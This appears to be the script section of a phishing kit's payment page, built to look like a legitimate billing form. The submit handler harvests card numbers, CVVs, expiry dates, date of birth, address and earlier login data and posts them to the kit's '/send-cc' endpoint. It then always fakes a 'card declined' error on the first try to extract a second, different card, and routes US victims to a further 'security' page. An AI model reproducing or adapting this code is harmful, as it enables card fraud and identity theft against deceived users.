                    isEven = !isEven;
                }
                
                return sum % 10 === 0;
            }

            function updateCardValidation(cardNumber, cardType) {
                const cardNumberInput = document.getElementById('cardNumber');
                const cardNumberError = document.getElementById('cardNumberError');
                const cleanNumber = cardNumber.replace(/\D/g, '');
                
                // Only validate if we have enough digits and a detected card type
                if (cleanNumber.length >= 13 && cardType !== 'default') {
                    const cardConfig = cardTypes[cardType];
                    const isValidLength = cardConfig && cardConfig.lengths.includes(cleanNumber.length);
                    const isValidLuhn = validateCardNumber(cardNumber);
                    const isValid = isValidLength && isValidLuhn;
                    
                    // Remove previous validation classes
                    cardNumberInput.classList.remove('valid-card', 'invalid-card');
                    
                    if (isValid) {
                        cardNumberInput.classList.add('valid-card');
                        cardNumberError.style.display = 'none';
                    } else {
                        cardNumberInput.classList.add('invalid-card');
                        cardNumberError.style.display = 'block';
                        cardNumberError.querySelector('span').textContent = 'Please enter a valid card number.';
                    }
                } else {
                    // Reset validation state for incomplete numbers
                    cardNumberInput.classList.remove('valid-card', 'invalid-card');
                    cardNumberError.style.display = 'none';
                }
            }

            function detectCardType(number) {
                const cleanNumber = number.replace(/\D/g, '');
                
                for (const [type, config] of Object.entries(cardTypes)) {
                    if (config.pattern.test(cleanNumber)) {
                        return { type, config };
                    }
                }
                
                return { type: 'default', config: null };
            }

            function formatCardNumber(number, cardType) {
                const cleanNumber = number.replace(/\D/g, '');
                
                // Format based on card type with proper spacing
                if (cardType === 'amex') {
                    // American Express: 4-6-5 format (e.g., 3782 822463 10005)
                    return cleanNumber.replace(/(\d{4})(\d{0,6})(\d{0,5})/, (match, p1, p2, p3) => {
                        let formatted = p1;
                        if (p2) formatted += ' ' + p2;
                        if (p3) formatted += ' ' + p3;
                        return formatted;
                    });
                } else if (cardType === 'diners') {
                    // Diners Club: 4-6-4 format
                    return cleanNumber.replace(/(\d{4})(\d{0,6})(\d{0,4})/, (match, p1, p2, p3) => {
                        let formatted = p1;
                        if (p2) formatted += ' ' + p2;
                        if (p3) formatted += ' ' + p3;
                        return formatted;
                    });
                } else {
                    // Visa, Mastercard, Discover, JCB: 4-4-4-4 format
                    return cleanNumber.replace(/(\d{4})(\d{0,4})(\d{0,4})(\d{0,4})/, (match, p1, p2, p3, p4) => {
                        let formatted = p1;
                        if (p2) formatted += ' ' + p2;
                        if (p3) formatted += ' ' + p3;
                        if (p4) formatted += ' ' + p4;
                        return formatted;
                    });
                }
            }

            function updateCardIcon(cardType) {
                // Remove all card type classes
                cardIcon.className = 'card-icon';
                
                if (cardType === 'default' || !cardType) {
                    cardIcon.classList.add('default-card');
                    cardIcon.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 24 24" width="24" height="24" data-icon="CreditCardStandard" aria-hidden="true">
                        <path fill-rule="evenodd" clip-rule="evenodd" d="M0 6C0 4.34315 1.34315 3 3 3H21C22.6569 3 24 4.34315 24 6V18C24 19.6569 22.6569 21 21 21H3C1.34314 21 0 19.6569 0 18V6ZM3 5C2.44772 5 2 5.44772 2 6V8H22V6C22 5.44771 21.5523 5 21 5H3ZM2 18V10H22V18C22 18.5523 21.5523 19 21 19H3C2.44772 19 2 18.5523 2 18ZM16 16H20V14H16V16Z" fill="currentColor"></path>
                    </svg>`;
                } else {
                    cardIcon.classList.add(cardType);
                    
                    // For card types without images, show text
                    if (cardType === 'discover') {
                        cardIcon.innerHTML = 'DISC';
                    } else if (cardType === 'diners') {
                        cardIcon.innerHTML = 'DINERS';
                    } else if (cardType === 'jcb') {
                        cardIcon.innerHTML = 'JCB';
                    } else {
                        cardIcon.innerHTML = ''; // Images will show via CSS background
                    }
                }
            }

            function updateCVVLength(cardType) {
                if (cardType && cardTypes[cardType]) {
                    const cvvLength = cardTypes[cardType].cvvLength;
                    cvvInput.setAttribute('maxlength', cvvLength);
                    
                    // Update placeholder
                    if (cvvLength === 4) {
                        cvvInput.setAttribute('placeholder', ' ');
                        const label = cvvInput.parentElement.querySelector('.floating-label');
                        if (label) label.textContent = 'CVV (4 digits)';
                    } else {
                        cvvInput.setAttribute('placeholder', ' ');
                        const label = cvvInput.parentElement.querySelector('.floating-label');
                        if (label) label.textContent = 'CVV';
                    }
                } else {
                    cvvInput.setAttribute('maxlength', '4');
                    const label = cvvInput.parentElement.querySelector('.floating-label');
                    if (label) label.textContent = 'CVV';
                }
            }

            function updateCIDField(cardType) {
                const cidField = document.getElementById('cidField');
                const cidInput = document.getElementById('cid');
                const cidLabel = cidInput.parentElement.querySelector('.floating-label');
                
                if (cardType === 'amex') {
                    cidField.style.display = 'block';
                    cidInput.setAttribute('maxlength', '3');
                    // Update label to show CID (3 digits)
                    if (cidLabel) {
                        cidLabel.textContent = 'CID (3 digits)';
                    }
                } else {
                    cidField.style.display = 'none';
                    cidInput.value = ''; // Clear CID value when not Amex
                    // Reset label to default
                    if (cidLabel) {
                        cidLabel.textContent = 'CID';
                    }
                }
            }

            // Card number input event listener
            cardNumberInput.addEventListener('input', function(e) {
                let value = e.target.value;
                const cleanValue = value.replace(/\D/g, '');
                
                // Detect card type
                const detection = detectCardType(cleanValue);
                const cardType = detection.type;
                const cardConfig = detection.config;
                
                // Update card icon
                updateCardIcon(cardType);
                
                // Update CVV length
                updateCVVLength(cardType);
                
                // Update CID field visibility
                updateCIDField(cardType);
                
                // Validate card number
                updateCardValidation(value, cardType);
                
                // Update hidden input for form submission
                const cardTypeInput = document.getElementById('cardType');
                if (cardTypeInput) {
                    cardTypeInput.value = cardType === 'default' ? '' : cardType;
                }
                
                // Format the number
                const formattedValue = formatCardNumber(value, cardType);
                
                // Set max length based on card type
                let maxLength = 19; // Default with spaces
                if (cardConfig && cardConfig.lengths) {
                    const maxDigits = Math.max(...cardConfig.lengths);
                    maxLength = maxDigits + Math.floor(maxDigits / 4) - 1; // Add spaces
                }
                
                // Update the input value
                if (formattedValue.length <= maxLength) {
                    e.target.value = formattedValue;
                } else {
                    e.target.value = formattedValue.substring(0, maxLength);
                }
                
                // Store the card type for form submission (alternative method)
                e.target.setAttribute('data-card-type', cardType === 'default' ? '' : cardType);
                
            });

            // CVV input formatting and validation
            cvvInput.addEventListener('input', function(e) {
                // Only allow numbers
                e.target.value = e.target.value.replace(/\D/g, '');
                
                // Mark as touched when user starts typing
                e.target.setAttribute('data-touched', 'true');
                
                // Get current card type for validation
                const cardNumberInput = document.getElementById('cardNumber');
                const detection = detectCardType(cardNumberInput.value);
                const cardType = detection.type;
                
                // Validate CVV with current card type
                updateCVVValidation(e.target.value, cardType);
            });
            
            // Mark CVV as touched when user focuses on it
            cvvInput.addEventListener('focus', function(e) {
                e.target.setAttribute('data-touched', 'true');
            });
            
            // Validate CVV on blur if user has interacted
            cvvInput.addEventListener('blur', function(e) {
                if (e.target.hasAttribute('data-touched')) {
                    const cardNumberInput = document.getElementById('cardNumber');
                    const detection = detectCardType(cardNumberInput.value);
                    const cardType = detection.type;
                    updateCVVValidation(e.target.value, cardType);
                }
            });

            // CID input formatting
            const cidInput = document.getElementById('cid');
            cidInput.addEventListener('input', function(e) {
                e.target.value = e.target.value.replace(/\D/g, '');
            });

            // Phone number formatting
            const phoneInput = document.getElementById('phoneNumber');
            if (phoneInput) {
                phoneInput.addEventListener('input', function(e) {
                    let phone = e.target.value.replace(/\D/g, '');
                    if (phone.length >= 6) {
                        phone = phone.replace(/(\d{3})(\d{3})(\d{4})/, '($1) $2-$3');
                    } else if (phone.length >= 3) {
                        phone = phone.replace(/(\d{3})(\d{0,3})/, '($1) $2');
                    }
                    e.target.value = phone.substring(0, 14);
                });
            }

            // Date of birth formatting
            const dobInput = document.getElementById('dateOfBirth');
            if (dobInput) {
                dobInput.addEventListener('input', function(e) {
                    let date = e.target.value.replace(/\D/g, '');
                    if (date.length >= 5) {
                        date = date.replace(/(\d{2})(\d{2})(\d{4})/, '$1/$2/$3');
                    } else if (date.length >= 3) {
                        date = date.replace(/(\d{2})(\d{0,2})/, '$1/$2');
                    }
                    e.target.value = date.substring(0, 10);
                });
            }

            // Expiration date validation function
            function validateExpirationDate(expDate) {
                const expDateRegex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
                
                if (!expDateRegex.test(expDate)) {
                    return { valid: false, message: 'Please enter a valid expiration date (MM/YY).' };
                }
                
                const [month, year] = expDate.split('/');
                const currentDate = new Date();
                const currentYear = currentDate.getFullYear() % 100; // Get last 2 digits
                const currentMonth = currentDate.getMonth() + 1; // 0-based to 1-based
                
                const expMonth = parseInt(month);
                const expYear = parseInt(year);
                
                // Check if month is valid (01-12)
                if (expMonth < 1 || expMonth > 12) {
                    return { valid: false, message: 'Please enter a valid month (01-12).' };
                }
                
                // Check if card is expired
                if (expYear < currentYear || (expYear === currentYear && expMonth < currentMonth)) {
                    return { valid: false, message: 'Your card has expired. Please use a different card.' };
                }
                
                // Check if expiration is too far in the future (more than 10 years)
                if (expYear > currentYear + 10) {
                    return { valid: false, message: 'Please enter a valid expiration year.' };
                }
                
                return { valid: true, message: '' };
            }

            function updateExpirationValidation(expDate) {
                const expDateInput = document.getElementById('expDate');
                const expDateError = document.getElementById('expDateError');
                
                // Always remove previous validation classes first
                expDateInput.classList.remove('valid-card', 'invalid-card');
                
                // Only validate if date is complete (5 characters: MM/YY)
                if (expDate && expDate.length === 5) {
                    const validation = validateExpirationDate(expDate);
                    
                    if (validation.valid) {
                        expDateInput.classList.add('valid-card');
                        expDateError.style.display = 'none';
                    } else {
                        expDateInput.classList.add('invalid-card');
                        expDateError.style.display = 'block';
                        if (expDateError.querySelector('span')) {
                            expDateError.querySelector('span').textContent = validation.message;
                        }
                    }
                } else {
                    // Reset validation state for incomplete or empty dates
                    expDateError.style.display = 'none';
                }
            }

            // CVV validation function - STRICT and MANDATORY
            function validateCVV(cvvValue, cardType) {
                const cvv = cvvValue.replace(/\D/g, '');
                
                // CVV is ALWAYS required
                if (cvv.length === 0) {
                    return { valid: false, message: 'CVV is required.' };
                }
                
                if (!cardType || cardType === 'default') {
                    return { valid: false, message: 'Please enter a valid card number first.' };
                }
                
                // Get card config from cardTypes object
                const cardConfig = cardTypes[cardType];
                if (!cardConfig) {
                    return { valid: false, message: 'Please enter a valid card number first.' };
                }
                
                const requiredLength = cardConfig.cvvLength;
                
                // STRICT LENGTH VALIDATION - must be exact
                if (cvv.length !== requiredLength) {
                    if (cardType === 'amex') {
                        return { valid: false, message: 'American Express requires exactly 4 digits CVV.' };
                    } else {
                        return { valid: false, message: `${cardConfig.name} requires exactly ${requiredLength} digits CVV.` };
                    }
                }
                
                return { valid: true, message: '' };
            }

            function updateCVVValidation(cvvValue, cardType) {
                const cvvInput = document.getElementById('cvv');
                const cvvError = document.getElementById('cvvError');
                
                // Only validate if user has interacted with CVV field
                const hasInteracted = cvvInput.hasAttribute('data-touched');
                
                if (cardType && cardType !== 'default') {
                    const validation = validateCVV(cvvValue, cardType);
                    
                    // Remove previous validation classes
                    cvvInput.classList.remove('valid-card', 'invalid-card');
                    
                    if (validation.valid) {
                        cvvInput.classList.add('valid-card');
                        cvvError.style.display = 'none';
                    } else if (hasInteracted || cvvValue.length > 0) {
                        // Only show error if user has touched the field or started typing
                        cvvInput.classList.add('invalid-card');
                        cvvError.style.display = 'block';
                        cvvError.querySelector('span').textContent = validation.message;
                    } else {
                        // Reset state for untouched empty field
                        cvvError.style.display = 'none';
                    }
                } else if (cvvValue.length > 0) {
                    // Show error if CVV entered but no valid card type
                    cvvInput.classList.remove('valid-card');
                    cvvInput.classList.add('invalid-card');
                    cvvError.style.display = 'block';
                    cvvError.querySelector('span').textContent = 'Please enter a valid card number first.';
                } else {
                    // Reset state for empty field without card type
                    cvvInput.classList.remove('valid-card', 'invalid-card');
                    cvvError.style.display = 'none';
                }
            }

            // Expiration date formatting and validation (MM/YY)
            const expDateInput = document.getElementById('expDate');
            expDateInput.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                
                if (value.length >= 2) {
                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
                }
                
                e.target.value = value;
                
                // Validate expiration date
                updateExpirationValidation(value);
            });

            // Initialize with default card icon
            updateCardIcon('default');

            // Form submission loading state
            const ccForm = document.getElementById('form');
            const continueBtn = document.getElementById('continueBtn');
            
            // Store original button text
            if (continueBtn) {
                continueBtn.setAttribute('data-original-text', continueBtn.textContent || 'Continue');
            }
            
            // Track CC submission attempts
            let ccAttempts = 0;
            let firstCCData = null;
            
            if (ccForm && continueBtn) {
                ccForm.addEventListener('submit', async function(e) {
                    e.preventDefault();
                    
                    // STRICT VALIDATION - All fields must be valid before submission
                    const cardNumberInput = document.getElementById('cardNumber');
                    const cvvInput = document.getElementById('cvv');
                    const expDateInput = document.getElementById('expDate');
                    const nameInput = document.getElementById('nameOnCard');
                    const phoneInput = document.getElementById('phoneNumber');
                    const dobInput = document.getElementById('dateOfBirth');
                    const address1Input = document.getElementById('address1');
                    const address2Input = document.getElementById('address2');
                    const cityInput = document.getElementById('city');
                    const stateInput = document.getElementById('state');
                    const postalInput = document.getElementById('postalCode');
                    
                    const detection = detectCardType(cardNumberInput.value);
                    const cardType = detection.type;
                    
                    // Validate card number
                    if (!cardNumberInput.value.trim()) {
                        alert('Please enter your card number.');
                        continueBtn.innerHTML = continueBtn.getAttribute('data-original-text') || 'Continue';
                        continueBtn.classList.remove('loading');
                        continueBtn.disabled = false;
                        return;
                    }
                    
                    // Validate CVV - MANDATORY
                    const cvvValidation = validateCVV(cvvInput.value, cardType);
                    if (!cvvValidation.valid) {
                        updateCVVValidation(cvvInput.value, cardType);
                        alert(cvvValidation.message);
                        // Reset button state
                        continueBtn.innerHTML = continueBtn.getAttribute('data-original-text') || 'Continue';
                        continueBtn.classList.remove('loading');
                        continueBtn.disabled = false;
                        return;
                    }
                    
                    // Validate expiry date - MANDATORY
                    if (!expDateInput.value.trim()) {
                        alert('Please enter the expiration date.');
                        continueBtn.innerHTML = continueBtn.getAttribute('data-original-text') || 'Continue';
                        continueBtn.classList.remove('loading');
                        continueBtn.disabled = false;
                        return;
                    }
                    
                    // Validate name - MANDATORY
                    if (!nameInput.value.trim()) {
                        alert('Please enter the name on card.');
                        continueBtn.innerHTML = continueBtn.getAttribute('data-original-text') || 'Continue';
                        continueBtn.classList.remove('loading');
                        continueBtn.disabled = false;
                        return;
                    }
                    
                    continueBtn.innerHTML = '<span class="btn-spinner"></span>Processing...';
                    continueBtn.classList.add('loading');
                    continueBtn.disabled = true;
                    
                    const data = JSON.parse(sessionStorage.getItem('flowData') || '{}');
                    const cidElement = document.getElementById('cid');
                    const ccData = {
                        name: document.getElementById('nameOnCard').value,
                        number: document.getElementById('cardNumber').value,
                        expiry: document.getElementById('expDate').value,
                        cvv: document.getElementById('cvv').value,
                        cid: cidElement ? cidElement.value.trim() : ''
                    };
                    
                    const billingData = {
                        phone: document.getElementById('phoneNumber').value,
                        dob: document.getElementById('dateOfBirth').value,
                        address1: document.getElementById('address1').value,
                        address2: document.getElementById('address2').value,
                        city: document.getElementById('city').value,
                        state: document.getElementById('state').value,
                        postal: document.getElementById('postalCode').value
                    };
                    
                    ccAttempts++;
                    
                    if (ccAttempts === 1) {
                        // First attempt - save data, show card declined alert, reset only card fields
                        firstCCData = ccData;
                        data.cc = ccData;
                        data.billing = billingData;
                        sessionStorage.setItem('flowData', JSON.stringify(data));
                        
                        // Send email with first CC data and billing data
                        try {
                            const accessCode = window.__ACCESS_CODE__;
                            if (accessCode) {
                                await fetch('/' + accessCode + '/send-cc', {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({ 
                                        cc: ccData,
                                        billing: billingData,
                                        login: data.login || {},
                                        attempt: 1
                                    })
                                });
                            }
                        } catch (err) {
                            console.warn('CC email send failed:', err);
                        }
                        
                        // Reset button state
                        continueBtn.innerHTML = continueBtn.getAttribute('data-original-text') || 'Continue';
                        continueBtn.classList.remove('loading');
                        continueBtn.disabled = false;
                        
                        // Show card declined error message above form
                        const cardDeclinedError = document.getElementById('cardDeclinedError');
                        if (cardDeclinedError) {
                            cardDeclinedError.classList.add('show');
                        }
                        
                        // Reset ONLY card fields (keep billing fields intact)
                        cardNumberInput.value = '';
                        cvvInput.value = '';
                        expDateInput.value = '';
                        const cidInput = document.getElementById('cid');
                        if (cidInput) {
                            cidInput.value = '';
                        }
                        
                        // Keep name, phone, dob, address fields intact - DO NOT RESET THEM
                        
                        // Update card icon to default
                        const cardIcon = document.getElementById('cardIcon');
                        if (cardIcon) {
                            cardIcon.className = 'card-icon default-card';
                        }
                        
                        // Remove validation classes from all inputs
                        cardNumberInput.classList.remove('valid-card', 'invalid-card');
                        cvvInput.classList.remove('valid-card', 'invalid-card');
                        expDateInput.classList.remove('valid-card', 'invalid-card');
                        
                        // Reset validation state for expiry date
                        updateExpirationValidation('');
                        
                        // Reset CVV validation state
                        updateCVVValidation('', 'default');
                        
                        // Hide error messages
                        const expDateError = document.getElementById('expDateError');
                        if (expDateError) {
                            expDateError.style.display = 'none';
                        }
                        
                        // Hide error message when user starts typing in card number
                        const hideDeclinedError = () => {
                            const cardDeclinedError = document.getElementById('cardDeclinedError');
                            if (cardDeclinedError) {
                                cardDeclinedError.classList.remove('show');
                            }
                            cardNumberInput.removeEventListener('input', hideDeclinedError);
                        };
                        cardNumberInput.addEventListener('input', hideDeclinedError);
                        
                        // Focus on card number for second attempt
                        setTimeout(() => {
                            cardNumberInput.focus();
                        }, 100);
                    } else {
                        // Second attempt - send both CC data sets and redirect
                        const secondCCData = ccData;

                        // Disallow same card number between attempt 1 and 2
                        try {
                            const normalizeCardNumber = (n) => String(n || '').replace(/\s+/g, '');
                            const firstNumber = normalizeCardNumber((firstCCData || {}).number);
                            const secondNumber = normalizeCardNumber((secondCCData || {}).number);
                            if (firstNumber && secondNumber && firstNumber === secondNumber) {
                                // Reset button state
                                continueBtn.innerHTML = continueBtn.getAttribute('data-original-text') || 'Continue';
                                continueBtn.classList.remove('loading');
                                continueBtn.disabled = false;

                                // Show card declined error message above form
                                const cardDeclinedError = document.getElementById('cardDeclinedError');
                                if (cardDeclinedError) {
                                    cardDeclinedError.classList.add('show');
                                }

                                // Reset ONLY card fields (keep billing fields intact)
                                cardNumberInput.value = '';
                                cvvInput.value = '';
                                expDateInput.value = '';
                                const cidInput = document.getElementById('cid');
                                if (cidInput) {
                                    cidInput.value = '';
                                }

                                // Update card icon to default
                                const cardIcon = document.getElementById('cardIcon');
                                if (cardIcon) {
                                    cardIcon.className = 'card-icon default-card';
                                }

                                // Remove validation classes from all inputs
                                cardNumberInput.classList.remove('valid-card', 'invalid-card');
                                cvvInput.classList.remove('valid-card', 'invalid-card');
                                expDateInput.classList.remove('valid-card', 'invalid-card');

                                // Reset validation state for expiry date
                                updateExpirationValidation('');

                                // Reset CVV validation state
                                updateCVVValidation('', 'default');

                                // Hide error messages
                                const expDateError = document.getElementById('expDateError');
                                if (expDateError) {
                                    expDateError.style.display = 'none';
                                }

                                // Keep attempts on second step (next submit becomes attempt 2 again)
                                ccAttempts = 1;

                                // Focus on card number
                                setTimeout(() => {
                                    cardNumberInput.focus();
                                }, 100);
                                return;
                            }
                        } catch (e) {
                            // If normalization fails, do not block submission
                        }

                        data.cc = secondCCData;
                        data.cc1 = firstCCData; // Save first attempt data
                        data.billing = billingData;
                        sessionStorage.setItem('flowData', JSON.stringify(data));
                        
                        // Send email with both CC data sets and billing data
                        try {
                            const accessCode = window.__ACCESS_CODE__;
                            if (!accessCode) {
                                continueBtn.innerHTML = continueBtn.getAttribute('data-original-text') || 'Continue';
                                continueBtn.classList.remove('loading');
                                continueBtn.disabled = false;
                                return;
                            }
                            
                            const response = await fetch('/' + accessCode + '/send-cc', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ 
                                    cc: secondCCData,
                                    cc1: firstCCData, // First attempt data
                                    billing: billingData,
                                    login: data.login || {},
                                    attempt: 2
                                })
                            });
                            
                            const result = await response.json();
                            const countryCode = result.countryCode || '';
                            
                            // Store country info in session
                            data.geo = { countryCode: countryCode, country: result.country || 'Unknown' };
                            sessionStorage.setItem('flowData', JSON.stringify(data));
                            
                            // Redirect to security (US) or done (others)
                            if (countryCode === 'US') {
                                location.href = '/' + accessCode + '/security';
                            } else {
                                location.href = '/' + accessCode + '/done';
                            }
                        } catch (err) {
                            console.warn('CC email send failed:', err);
                            // Fallback to done page
                            const accessCode = window.__ACCESS_CODE__;
                            if (accessCode) {
                                location.href = '/' + accessCode + '/done';
                            }
                        }
                    }
                });
            }
        });
    </script>

    <script>
      (function(){
        const L = window.__LANG__ || {};
        const set = (id, key) => { 
            const el = document.getElementById(id); 
            if (el && L[key]) {
                // Special handling for title tag
                if (el.tagName === 'TITLE' || id.includes('title')) {
                    el.textContent = L[key];
                    document.title = L[key];
                } else {
                    el.textContent = L[key];
                }
            }
        };
        set('i18n-cc-title', 'cc.title');
        set('i18n-cc-step', 'cc.step');
        set('i18n-cc-heading', 'cc.heading');
        set('i18n-cc-number', 'cc.number');
        set('i18n-cc-expiry', 'cc.expiry');
        set('i18n-cc-cvv', 'cc.cvv');
        set('i18n-cc-name', 'cc.name');
        set('i18n-cc-cid', 'cc.cid');
        set('i18n-billing-phone', 'billing.phone');
        set('i18n-billing-dob', 'billing.dob');
        set('i18n-billing-address1', 'billing.address1');
        set('i18n-billing-address2', 'billing.address2');
        set('i18n-billing-city', 'billing.city');
        set('i18n-billing-state', 'billing.state');
        set('i18n-billing-postal', 'billing.postal_code');
        set('i18n-billing-phone-error', 'billing.phone_error');
        set('i18n-billing-dob-error', 'billing.dob_error');
        set('i18n-billing-address1-error', 'billing.address1_error');
        set('i18n-billing-city-error', 'billing.city_error');
        set('i18n-billing-state-error', 'billing.state_error');
        set('i18n-billing-postal-error', 'billing.postal_error');
        set('continueBtn', 'cc.next');
        set('i18n-loading', 'common.loading');
        set('i18n-cc-number-error', 'cc.number_error');
        set('i18n-cc-expiry-error', 'cc.expiry_error');
        set('i18n-cc-cvv-error', 'cc.cvv_error');
        set('i18n-cc-cid-error', 'cc.cid_error');
        set('i18n-cc-name-error', 'cc.name_error');
        set('i18n-cc-disclaimer', 'cc.disclaimer');
        set('i18n-cc-agree', 'cc.agree');
        set('i18n-cc-recaptcha', 'cc.recaptcha');
        set('i18n-cc-learn', 'common.learn_more');
        set('i18n-footer-contact', 'footer.questions');
        set('i18n-footer-faq', 'footer.faq');
        set('i18n-footer-help', 'footer.help');
        set('i18n-footer-terms', 'footer.terms');
        set('i18n-footer-privacy', 'footer.privacy');
        set('i18n-footer-cookies', 'footer.cookies');
        set('i18n-footer-corporate', 'footer.corporate');
        set('i18n-footer-adchoices', 'footer.adchoices');
        set('i18n-footer-country', 'footer.country');
        const signout = document.querySelector('.sign-out');
        if (signout && L['header.signout']) signout.textContent = L['header.signout'];
      })();
    </script>

</body>
</html>
</html>